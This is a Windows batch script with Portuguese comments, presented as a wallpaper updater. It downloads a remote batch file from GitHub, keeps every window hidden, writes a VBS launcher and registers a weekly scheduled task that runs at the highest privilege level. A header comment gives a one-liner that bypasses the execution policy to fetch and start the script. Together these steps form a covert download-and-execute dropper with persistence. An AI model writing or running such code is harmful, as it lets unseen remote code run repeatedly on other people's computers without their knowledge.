@echo off
REM Script para atualizar papel de parede - Execução totalmente invisível
REM Executa via PowerShell do GitHub: powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/USER/REPO/main/starter.bat' -OutFile 'starter.bat'; Start-Process -FilePath 'starter.bat' -WindowStyle Hidden"

REM ==========================================
REM CONFIGURAÇÕES
REM ==========================================
set "SAVE_DIR=C:\ProgramData\TrulWallpaper"
set "BAT_FILE=%SAVE_DIR%\atualizar_wallpaper.bat"
set "VBS_FILE=%SAVE_DIR%\iniciar_invisivel.vbs"
set "TASK_NAME=TrulWallpaperUpdater"
set "BAT_URL=https://raw.githubusercontent.com/mathaussobrinho/trul/main/atualizar_wallpaper.bat"

REM Cria pasta se não existir (silencioso)
if not exist "%SAVE_DIR%" mkdir "%SAVE_DIR%" >nul 2>&1

REM Baixa script principal (invisível)
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%BAT_FILE%' -UseBasicParsing -ErrorAction Stop | Out-Null } catch { }"

REM Se não conseguiu baixar, cria script local básico (sem abrir imagem)
if not exist "%BAT_FILE%" (
    (
        echo @echo off
        echo REM Script para atualizar papel de parede - Execução invisível
        echo set "CURRENT_DIR=%%~dp0"
        echo set "IMAGE_NAME=wallpaper.png"
        echo set "IMAGE_URL=https://raw.githubusercontent.com/mathaussobrinho/trul/main/trul.png?raw=true"
        echo powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%%IMAGE_URL%%' -OutFile '%%CURRENT_DIR%%%%IMAGE_NAME%%' -UseBasicParsing -ErrorAction SilentlyContinue"
        echo powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name wallpaper -Value '%%CURRENT_DIR%%%%IMAGE_NAME%%' -ErrorAction SilentlyContinue"
        echo powershell -WindowStyle Hidden -Command "Add-Type 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\", SetLastError=true)] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }'; [W]::SystemParametersInfo(20, 0, \"%%CURRENT_DIR%%%%IMAGE_NAME%%\", 0x01 -bor 0x02)"
        echo exit
    ) > "%BAT_FILE%"
)

REM Cria script VBS para executar invisível
(
    echo Set WshShell = CreateObject("WScript.Shell"^)
    echo WshShell.Run "%BAT_FILE%", 0, False
) > "%VBS_FILE%"

REM Verifica se a tarefa já existe
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel%==0 (
    REM Tarefa já existe, não cria novamente
) else (
    REM Cria tarefa agendada para sexta-feira às 10:00
    schtasks /create /sc weekly /d FRI /tn "%TASK_NAME%" /tr "wscript.exe \"%VBS_FILE%\"" /st 10:00 /rl HIGHEST /f >nul 2>&1
)

REM Executa atualização agora (invisível)
wscript.exe "%VBS_FILE%" >nul 2>&1

REM Fecha silenciosamente
exit /b 0

